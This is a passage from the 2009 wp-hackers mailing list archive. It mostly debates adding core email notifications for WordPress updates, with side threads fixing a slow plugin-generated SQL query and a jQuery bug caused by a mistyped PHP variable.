> > True, but an automatic email notification to the admin would just have
> > lots of people asking us how to turn it off.
> >
>
> Then give them a way to turn it off.
>

There's already a plugin that emails the admin when a new version is
available:

http://wordpress.org/extend/plugins/upgrade-notification-by-email/


-- 
http://scribu.net

From ncrice at gmail.com  Fri Oct 16 15:27:55 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Fri, 16 Oct 2009 11:27:55 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
Message-ID: <862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>

On Fri, Oct 16, 2009 at 11:19 AM, Sharon Chambers <sharon at brewerradio.com>wrote:

>
> I would call it annoyance.  Anyone professing themselves to be website
> admin should be logging into their dashboard on occasion, and anyone failing
> to do so has no one but themselves to blame for security threats.
>
> I fail to see why a non-geek web admin would be considered "normal" at any
> rate.
>
>
That's exactly the attitude that gives WP the reputation it has for
security. That everyone who uses WP is a professional and should be
responsible not only to upgrade their install every time a new version comes
out, but should also be proactive about checking for upgrades.

Now, personally, I believe they SHOULD do both of those things. But I live
in reality, where they WON'T do both of those things.

So, we can either sit cross-armed and blame the stupid users, or we can
continue to provide them with tools that anticipate their lack of
provocativeness, like a simple email notification.

And no, a plugin won't suffice. It's a extra step that most users won't
take.

From jeffc at wptavern.com  Fri Oct 16 16:21:40 2009
From: jeffc at wptavern.com (Jeff Chandler)
Date: Fri, 16 Oct 2009 12:21:40 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
References: <862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
Message-ID: <4AD89D94.4050401@wptavern.com>

I'm with Nathan on this one. I don't see the harm in having WordPress 
email the site administrator as one additional way of being notified of 
an upgrade when the site detects it's available. This would be 
especially useful for mobile users as email is a much nicer and 
accessible way to this information considering logging into the 
dashboard from a mobile device sucks or is impossible. This would be one 
more way of eliminating the excuse that they were not notified in time 
of the upgrade.

When I first started using WordPress, I signed up to the WordPress 
Announcements mailing list because I wanted to be notified of when a new 
update was available via Email because I check email 100 times a day 
versus RSS feeds or the dashboard. Well, that list is as good as dead. 
The only time I've received an email from that list is a big 
announcement email regarding WordPress 2.7 from Matt Mullenweg. That's 
it, in the span of two years. So this would turn the WP Announcements 
mailing list into something automated controlled by the blog owner for 
the site administrator since the middle man ain't cutting it anymore.

From jer at simianuprising.com  Fri Oct 16 16:37:16 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Fri, 16 Oct 2009 12:37:16 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
Message-ID: <e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>

On Fri, Oct 16, 2009 at 11:27 AM, Nathan Rice <ncrice at gmail.com> wrote:
> On Fri, Oct 16, 2009 at 11:19 AM, Sharon Chambers <sharon at brewerradio.com>wrote:
> And no, a plugin won't suffice. It's a extra step that most users won't
> take.

I have to say +1 on this idea. It would be a simple step to add a
checkbox during installation that says something like

   [x] Email me when WordPress needs to be updated so it can stay secure.

I know that in my own case this would generate at least a dozen emails
in my inbox and I'd groan and sigh and complain, but that's what I
*need to do*. We're all riding this roller coaster of security because
we think WP is worth it, but there's a price. Solving the security
problems with WP probably *needs* to be annoying, otherwise it won't
get us to do the work we need to do to improve the situation.

P.S. Sharon, can you please do something about your email signature,
its so frikkin' long, it drives me crazy. Maybe cut it down for
mailing list postings?

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From jeremib at gmail.com  Fri Oct 16 16:44:41 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Fri, 16 Oct 2009 12:44:41 -0400
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
Message-ID: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com>

It seems there's this one query,
SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
'post' AND (wp_posts.post_status = 'publish') AND NOT EXISTS (SELECT * FROM
wp_term_relationships JOIN wp_term_taxonomy ON
wp_term_taxonomy.term_taxonomy_id = wp_term_relationships.term_taxonomy_id
WHERE wp_term_relationships.object_id = wp_posts.ID AND
wp_term_taxonomy.taxonomy = 'category' AND wp_term_taxonomy.term_id IN (89)
) ORDER BY wp_posts.post_date DESC LIMIT 0, 50;

That is locking up my database and bringing down my site, at least once a
day. When I look in the slow queries log, it's full of them.

# Time: 091016 8:56:50
# User at Host: mrsec_wp[mrsec_wp] @ localhost []
# Query_time: 13 Lock_time: 0 Rows_sent: 50 Rows_examined: 185675
use mrsec_wp;
SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status =
'private') AND NOT EXISTS (SELECT * FROM wp_term_relationships JOIN
wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
wp_term_relationships.term_taxonomy_id WHERE wp_term_relationships.object_id
= wp_posts.ID AND wp_term_taxonomy.taxonomy = 'category' AND
wp_term_taxonomy.term_id IN (89) ) ORDER BY wp_posts.post_date DESC LIMIT 0,
50;

Any thoughts on how I can optimize this query?  It takes approx 13 seconds
to execute this query. I have 28k records.

Thanks
-- 
Jeremi Bergman
865-622-7134

From g30rg3x at gmail.com  Fri Oct 16 16:53:57 2009
From: g30rg3x at gmail.com (g30rg3_x)
Date: Fri, 16 Oct 2009 11:53:57 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
Message-ID: <d5d5430f0910160953r265c0b96j25cb4683e2fae1c9@mail.gmail.com>

2009/10/16 Nathan Rice <ncrice at gmail.com>:
> That's exactly the attitude that gives WP the reputation it has for
> security. That everyone who uses WP is a professional and should be
> responsible not only to upgrade their install every time a new version comes
> out, but should also be proactive about checking for upgrades.
Excuse me but, isn't that the actual objective to be running a
self-hosted wordpress blog instead of one in wordpress.com?
so you can control upgrades, plugins, themes, ...?
IMHO, admins that does not want to take matter on their own hands
should be using one hosted at wordpress.com instead of a self-hosted
one...

> Now, personally, I believe they SHOULD do both of those things. But I live
> in reality, where they WON'T do both of those things.
>
> So, we can either sit cross-armed and blame the stupid users, or we can
> continue to provide them with tools that anticipate their lack of
> provocativeness, like a simple email notification.
There is the wordpress development blog feed, the wordpress planet
feed, the hundred of wordpress-fanatics feeds in lots of languages
just talking about wordpress development and of course news and
security alerts, which you can use with your preferred feed reader.
If that isn't enough you can made (or find one like the one linked by
scribu here) your own plugin and stay up-to-date with notifications
(cause you should also consider not only wordpress update
notifications also you should consider plugins updates notifications
in your wordpress security-plan) about upgrades/updates.
Still not convinced?
Then go to core.trac.wordpress.org/timeline were you can review all
the changes made by the wp-dev-team (it also has feed, so you can be
always update-to-date with the wordpress changes, tickets,
milestones...).
So, you could just sit cross-armed and blame the wordpress dev-team
for not providing enough tools for update notifications or well
actually code a plugin and then propose the core integration of the
functionality (which is actually the way that wordpress consider new
features).

> And no, a plugin won't suffice. It's a extra step that most users won't
> take.
As i say before... if and a admin does not want to take matter on
their own hands then it should consider be using one hosted at
wordpress.com (almost always the bleeding edge of the wordpress-core).
There are lots of ways a wordpress-based site could be broken besides
wordpress itself as i say, you have the plugins, the themes, the
php-interpreter, 3rd-party-sites in a shared hosting environment,
services misconfiguration, weak passwords, ... just to enumerate the
most well-know direct and indirect attacks.

As for the core integration proposal...
+1 if the update notification email also consider plugins in the notification.
-1 if it will only be just the wordpress core updates.

Regards
PS: Pardon me, my really bad mexican-english.
_________________________
             g30rg3_x

From jmiloj at gmail.com  Fri Oct 16 16:54:54 2009
From: jmiloj at gmail.com (Jerry Johnson)
Date: Fri, 16 Oct 2009 12:54:54 -0400
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com>
Message-ID: <a1fff2b20910160954w11d2dabj2f8632cbf09204f7@mail.gmail.com>

Jeremi,

We are having the same problem.

One of our senior devs did this, which has helped greatly:

http://core.trac.wordpress.org/ticket/10964

Jerry Johnson
Senior Application Developer
*Dolan Media Company* (NYSE:DM)
612.659.7363 :: 612.718.8781 (m)
jerry.johnson [at] dolanmedia [dot] com

On Fri, Oct 16, 2009 at 12:44 PM, Jeremi Bergman <jeremib at gmail.com> wrote:

> It seems there's this one query,
> SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
> wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)



> <snip>
>


> Any thoughts on how I can optimize this query?  It takes approx 13 seconds
> to execute this query. I have 28k records.
>
>

From info at toscho.de  Fri Oct 16 17:02:41 2009
From: info at toscho.de (Thomas Scholz)
Date: Fri, 16 Oct 2009 19:02:41 +0200
Subject: [wp-hackers] wordpress security
In-Reply-To: <e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
Message-ID: <op.u1wkarrbr6yny2@toscho.de>

Jeremy Clarke:

> On Fri, Oct 16, 2009 at 11:27 AM, Nathan Rice <ncrice at gmail.com> wrote:
>> On Fri, Oct 16, 2009 at 11:19 AM, Sharon Chambers  
>> <sharon at brewerradio.com>wrote:
>> And no, a plugin won't suffice. It's a extra step that most users won't
>> take.
>
> I have to say +1 on this idea.

Me too.

> I know that in my own case this would generate at least a dozen emails
> in my inbox and I'd groan and sigh and complain, but that's what I
> *need to do*.

I'd get a lot of mails too, and this is one reason why I would find it  
helpful: I would not forget one of the blogs where I'm the admin and not  
an author.

Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From otto at ottodestruct.com  Fri Oct 16 17:29:11 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 16 Oct 2009 12:29:11 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <op.u1wkarrbr6yny2@toscho.de>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com> 
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com> 
	<op.u1wkarrbr6yny2@toscho.de>
Message-ID: <161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>

Question to those of you who like this idea of emailing the admin for
upgrade notification:

Are you currently using this plugin?
http://wordpress.org/extend/plugins/upgrade-notification-by-email/

If not, why not?

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Fri Oct 16 17:35:49 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 16 Oct 2009 12:35:49 -0500
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com>
Message-ID: <161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com>

That doesn't appear to be a core query. At least, not in the latest
trunk (no idea on 2.8.4). The word "EXISTS" is not used in that sort
of context anywhere in the code that I can see.

Got any weird plugins?

-Otto
Sent from Memphis, TN, United States


On Fri, Oct 16, 2009 at 11:44 AM, Jeremi Bergman <jeremib at gmail.com> wrote:
> It seems there's this one query,
> SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
> wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
> LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
> wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
> 'post' AND (wp_posts.post_status = 'publish') AND NOT EXISTS (SELECT * FROM
> wp_term_relationships JOIN wp_term_taxonomy ON
> wp_term_taxonomy.term_taxonomy_id = wp_term_relationships.term_taxonomy_id
> WHERE wp_term_relationships.object_id = wp_posts.ID AND
> wp_term_taxonomy.taxonomy = 'category' AND wp_term_taxonomy.term_id IN (89)
> ) ORDER BY wp_posts.post_date DESC LIMIT 0, 50;
>
> That is locking up my database and bringing down my site, at least once a
> day. When I look in the slow queries log, it's full of them.
>
> # Time: 091016 8:56:50
> # User at Host: mrsec_wp[mrsec_wp] @ localhost []
> # Query_time: 13 Lock_time: 0 Rows_sent: 50 Rows_examined: 185675
> use mrsec_wp;
> SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
> wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
> LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
> wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
> 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status =
> 'private') AND NOT EXISTS (SELECT * FROM wp_term_relationships JOIN
> wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
> wp_term_relationships.term_taxonomy_id WHERE wp_term_relationships.object_id
> = wp_posts.ID AND wp_term_taxonomy.taxonomy = 'category' AND
> wp_term_taxonomy.term_id IN (89) ) ORDER BY wp_posts.post_date DESC LIMIT 0,
> 50;
>
> Any thoughts on how I can optimize this query? ?It takes approx 13 seconds
> to execute this query. I have 28k records.
>
> Thanks
> --
> Jeremi Bergman
> 865-622-7134
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ncrice at gmail.com  Fri Oct 16 17:37:28 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Fri, 16 Oct 2009 13:37:28 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
Message-ID: <862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>

On Fri, Oct 16, 2009 at 1:29 PM, Otto <otto at ottodestruct.com> wrote:

> Question to those of you who like this idea of emailing the admin for
> upgrade notification:
>
> Are you currently using this plugin?
> http://wordpress.org/extend/plugins/upgrade-notification-by-email/
>
> If not, why not?
>


No, because I subscribe to all the WordPress feeds, random WP-related blogs,
and follow countless people on Twitter that are happy to notify me when a
new version is released. I don't need to be alerted by email. Plus, I don't
use the automatic upgrade feature. All my blogs are updated via SVN once per
hour.

I'm not normal.

From bryanspahr at gmail.com  Fri Oct 16 17:49:48 2009
From: bryanspahr at gmail.com (Bryan Spahr)
Date: Fri, 16 Oct 2009 13:49:48 -0400
Subject: [wp-hackers] wordpress security
Message-ID: <5d49cb490910161049h3f4ea95erfdd165e7839eab33@mail.gmail.com>

>
>
> So, we can either sit cross-armed and blame the stupid users, or we can
> continue to provide them with tools that anticipate their lack of
> provocativeness, like a simple email notification.
>
> And no, a plugin won't suffice. It's a extra step that most users won't
> take.
>
>
>
+1 for the real world perspective

This idea has been proposed before, so I'll second:  have an option to "send
email to the admin when there is an upgrade available", along with a
configurable interval to send repeat / reminder emails.

Bryan

From scribu at gmail.com  Fri Oct 16 17:57:23 2009
From: scribu at gmail.com (scribu)
Date: Fri, 16 Oct 2009 20:57:23 +0300
Subject: [wp-hackers] wordpress security
In-Reply-To: <5d49cb490910161049h3f4ea95erfdd165e7839eab33@mail.gmail.com>
References: <5d49cb490910161049h3f4ea95erfdd165e7839eab33@mail.gmail.com>
Message-ID: <349fe48b0910161057n38eb0316p427c57ebf120cb5@mail.gmail.com>

On Fri, Oct 16, 2009 at 8:49 PM, Bryan Spahr <bryanspahr at gmail.com> wrote:

> >
> >
> > So, we can either sit cross-armed and blame the stupid users, or we can
> > continue to provide them with tools that anticipate their lack of
> > provocativeness, like a simple email notification.
> >
> > And no, a plugin won't suffice. It's a extra step that most users won't
> > take.
> >
> >
> >
> +1 for the real world perspective
>
> This idea has been proposed before, so I'll second:  have an option to
> "send
> email to the admin when there is an upgrade available", along with a
> configurable interval to send repeat / reminder emails.
>

I agree that a checkbox somewhere wouldn't hurt.

So, anyone up for a patch on trac? Post the ticket number back here.


-- 
http://scribu.net

From jer at simianuprising.com  Fri Oct 16 18:01:21 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Fri, 16 Oct 2009 14:01:21 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
Message-ID: <e1202cb10910161101u37ad2b6ah82040ef3f7b9b006@mail.gmail.com>

On Fri, Oct 16, 2009 at 1:29 PM, Otto <otto at ottodestruct.com> wrote:
> Question to those of you who like this idea of emailing the admin for
> upgrade notification:
>
> Are you currently using this plugin?
> http://wordpress.org/extend/plugins/upgrade-notification-by-email/
>
> If not, why not?

I don't use it because in my 5+ years of using WP and installing it
all over the place I've worked out lo-fi systems (i.e. a text file)
where i list all the WP installs I'm responsible for and their
versions. When there is an update I learn about it on Twitter (because
I follow tons of WP people, not something I recommend to normal users)
and know to reconsider my text file and try to keep them all up to
date.

So I personally don't really need the plugin or the feature. I'd still
use it, but going back to the old installs and installing the plugin
is more than its worth for me.

Others among us might use automatic svn or have special bash scripts
or WP plugins that keep track of multiple installations instead of my
wimpy text file. These are all great solutions for experts who have
experience and know what they're doing, but there needs to be more
pressure on newbies to pick up the importance of updating, and telling
them to install another plugin is a pretty innefective way IMHO. It
feels to me like preaching to the choir: if you know enough to install
plugins like that then you probably know its important to stay up to
date and have experience. I mean, how many of us have been hacked at
some point? I have multiple times, that's how I learned (and I still
don't always update fast enough!), if WP wants to improve its image it
has to start annoying people BEFORE they are hacked, not after.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From ncrice at gmail.com  Fri Oct 16 18:04:42 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Fri, 16 Oct 2009 14:04:42 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <e1202cb10910161101u37ad2b6ah82040ef3f7b9b006@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<e1202cb10910161101u37ad2b6ah82040ef3f7b9b006@mail.gmail.com>
Message-ID: <862d087f0910161104i5794ef40pf79b2080decf87d0@mail.gmail.com>

On Fri, Oct 16, 2009 at 2:01 PM, Jeremy Clarke <jer at simianuprising.com>wrote:

> On Fri, Oct 16, 2009 at 1:29 PM, Otto <otto at ottodestruct.com> wrote:
>


> if WP wants to improve its image it
> has to start annoying people BEFORE they are hacked, not after.
>

Well said.

From gaarai at gaarai.com  Fri Oct 16 18:33:36 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Fri, 16 Oct 2009 13:33:36 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>	<op.u1wkarrbr6yny2@toscho.de>	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
Message-ID: <4AD8BC80.6000406@gaarai.com>

Nathan is making a great point here, and I think a large number of
people are missing it. The idea of the notification isn't for people
like those of us reading this thread. The regular everyday WordPress
site admin is not subscribed to this list, they have no voice here.
Thus, it is our responsibility to try to anticipate what those missing
voices would say.

There are people who have said that admins can easily subscribe to an
RSS feed. Great, who will tell them about the RSS feed and what it means
to them? There certainly isn't such a notification currently.

In addition, even as a techy person, I hate RSS. I'm going to run yet
another program to demand my attention? No thanks. Most people that run
a WP site use email, a significantly smaller portion also actively check
RSS feeds.

There are those here who have voiced an opinion that it is an annoyance
as they have a multitude of blogs. Oh well... Deal with it. Most people
are only going to have one to three blogs, a very manageable number.

The reason that such an email notification feature is a recommendation
is to help those who aren't like the members of the hackers list and
don't keep up with all the latest WP buzz. So, for members of this list
to say that they wouldn't like it, oh well, it's not aimed at you, it's
aimed at everyone else.

Some people are saying that only nerds need apply when running a
WordPress blog. Really? Are we elitist now? The idea of WordPress is
that even your average non-techy person can run their own site easily.
The fact of the matter is that having more non-techy people on WP helps
WP keep growing and diversifying. How about we give the non-techy person
a hand and help them deal with security in a smart/informed way?

I fully back Nathan's idea. I think that having it in core and not as a
plugin is essential.

g30rg3_x says that it will only be acceptable if it includes plugin
update notifications. I think that expanding the functionality to
plugins would be great. However, I think we should do this a step at a time.

    * First, add the WP version update email message to core.
    * Second, polish out any kinks from the implementation and get feedback.
    * Third, looking at the feedback, implement a system that notifies
      about plugin update availability as well. This notification period
      can be tuned to notify immediately as new versions are available,
      provide a daily digest of updates, provide a weekly digest, or
      turn it off.

That's my recommendation. If we throw everything at everyone
immediately, a huge backlash will form, and a good idea would be wasted
due to hasty implementation.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Nathan Rice wrote:
> No, because I subscribe to all the WordPress feeds, random WP-related blogs,
> and follow countless people on Twitter that are happy to notify me when a
> new version is released. I don't need to be alerted by email. Plus, I don't
> use the automatic upgrade feature. All my blogs are updated via SVN once per
> hour.
>
> I'm not normal.

From mpwalsh8 at gmail.com  Fri Oct 16 18:45:53 2009
From: mpwalsh8 at gmail.com (Mike Walsh)
Date: Fri, 16 Oct 2009 14:45:53 -0400
Subject: [wp-hackers] jQuery Error in IE but not FF
In-Reply-To: <bd35beb50910151251o683f4a4as6bd5fac92a23ba28@mail.gmail.com>
References: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com>
	<4AD6B5C6.6080808@laptoptips.ca>
	<bd35beb50910150321h8419d9h83bc6cd19f19918f@mail.gmail.com>
	<7f2794f8-bfd8-486d-a615-4b54c59b3b25@2g2000prl.googlegroups.com>
	<bd35beb50910151251o683f4a4as6bd5fac92a23ba28@mail.gmail.com>
Message-ID: <bd35beb50910161145o5fab43cfy4e7c77bb6f65f4f5@mail.gmail.com>

On Thu, Oct 15, 2009 at 3:51 PM, Mike Walsh <mpwalsh8 at gmail.com> wrote:
>
> I'll see if I can figure out how to post it, you may have to look at
> the whole theme to see the problem. ?I am pretty sure it is on my end
> because this jQuery UI demo works and my code is based on this demo.
>
> http://jqueryui.com/demos/droppable/#photo-manager
>
> Mike
>

I resolved my problem this afternoon.  It still isn't clear to me why
it worked in FireFox at all after finding the problem.

I had embedded the value of a PHP variable in my Javascript code and
there was a typo in the PHP variable name:

$item.animate({ width: '<?php echo $thumbnail_width . "px" ?>'
}).find('img').animate({ height: '<?php echo $thumbnail_height . "px"
?>' })

I had mispelled "thumbnail" as "thunbmail".  So my problem is solved
and I am on to the next issue!

Mike

--
Mike Walsh - mpwalsh at gmail.com

From jeremib at gmail.com  Fri Oct 16 18:56:47 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Fri, 16 Oct 2009 14:56:47 -0400
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com> 
	<161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com>
Message-ID: <f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com>

Actually, I believe you are right.  I narrowed it down to the *Advanced
Category Excluder*  plugin.  I've disabled it, and am watching the slow
query logs.

Thanks

On Fri, Oct 16, 2009 at 1:35 PM, Otto <otto at ottodestruct.com> wrote:

> That doesn't appear to be a core query. At least, not in the latest
> trunk (no idea on 2.8.4). The word "EXISTS" is not used in that sort
> of context anywhere in the code that I can see.
>
> Got any weird plugins?
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Fri, Oct 16, 2009 at 11:44 AM, Jeremi Bergman <jeremib at gmail.com>
> wrote:
> > It seems there's this one query,
> > SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
> > wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
> > LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
> > wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
> > 'post' AND (wp_posts.post_status = 'publish') AND NOT EXISTS (SELECT *
> FROM
> > wp_term_relationships JOIN wp_term_taxonomy ON
> > wp_term_taxonomy.term_taxonomy_id =
> wp_term_relationships.term_taxonomy_id
> > WHERE wp_term_relationships.object_id = wp_posts.ID AND
> > wp_term_taxonomy.taxonomy = 'category' AND wp_term_taxonomy.term_id IN
> (89)
> > ) ORDER BY wp_posts.post_date DESC LIMIT 0, 50;
> >
> > That is locking up my database and bringing down my site, at least once a
> > day. When I look in the slow queries log, it's full of them.
> >
> > # Time: 091016 8:56:50
> > # User at Host: mrsec_wp[mrsec_wp] @ localhost []
> > # Query_time: 13 Lock_time: 0 Rows_sent: 50 Rows_examined: 185675
> > use mrsec_wp;
> > SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
> > wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
> > LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
> > wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
> > 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status =
> > 'private') AND NOT EXISTS (SELECT * FROM wp_term_relationships JOIN
> > wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
> > wp_term_relationships.term_taxonomy_id WHERE
> wp_term_relationships.object_id
> > = wp_posts.ID AND wp_term_taxonomy.taxonomy = 'category' AND
> > wp_term_taxonomy.term_id IN (89) ) ORDER BY wp_posts.post_date DESC LIMIT
> 0,
> > 50;
> >
> > Any thoughts on how I can optimize this query?  It takes approx 13
> seconds
> > to execute this query. I have 28k records.
> >
> > Thanks
> > --
> > Jeremi Bergman
> > 865-622-7134
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeremi Bergman
865-622-7134

From otto at ottodestruct.com  Fri Oct 16 19:18:35 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 16 Oct 2009 14:18:35 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <4AD8BC80.6000406@gaarai.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com> 
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com> 
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com> 
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com> 
	<4AD8BC80.6000406@gaarai.com>
Message-ID: <161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>

Excuse my slightly offtopic rant for a moment...

On Fri, Oct 16, 2009 at 1:33 PM, Chris Jean <gaarai at gaarai.com> wrote:
> Some people are saying that only nerds need apply when running a
> WordPress blog. Really? Are we elitist now? The idea of WordPress is
> that even your average non-techy person can run their own site easily.

I've always disagreed with that.

If you're a non-techy person, then you shouldn't be hosting your own
website in the first place. You should be using a service to do it for
you, like WordPress.com or Blogger or *something*.

See, it's always the non-techy types that get into real problems
running a website, and they're always the ones that get all ticked off
